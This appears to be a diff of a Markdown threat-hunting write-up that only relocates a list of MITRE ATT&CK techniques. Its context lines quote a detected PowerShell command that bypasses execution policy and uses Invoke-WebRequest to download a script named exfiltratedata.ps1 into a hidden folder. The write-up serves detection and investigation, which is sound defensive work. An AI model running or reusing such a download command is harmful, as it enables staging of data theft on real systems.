@@ -26,10 +26,6 @@ DeviceProcessEvents
 | order by TimeGenerated
 ```
 
-**Relevant TTPs:**
-- **[T1059.001](https://attack.mitre.org/techniques/T1059/001/)**: Command and Scripting Interpreter: PowerShell
-- **[T1105](https://attack.mitre.org/techniques/T1105/)**: Ingress Tool Transfer
-
 ![ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)
 
 This query detected the following suspicious command:
@@ -39,6 +35,10 @@ powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://r
 ```
 
 The command indicated that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet to C:\ProgramData, a folder that is hidden by default on Windows. This suggests an attempt to conceal the file's presence and triggered further investigation.
+
+**Relevant TTPs:**
+- **[T1059.001](https://attack.mitre.org/techniques/T1059/001/)**: Command and Scripting Interpreter: PowerShell
+- **[T1105](https://attack.mitre.org/techniques/T1105/)**: Ingress Tool Transfer
 
 ### User Inquiry
 
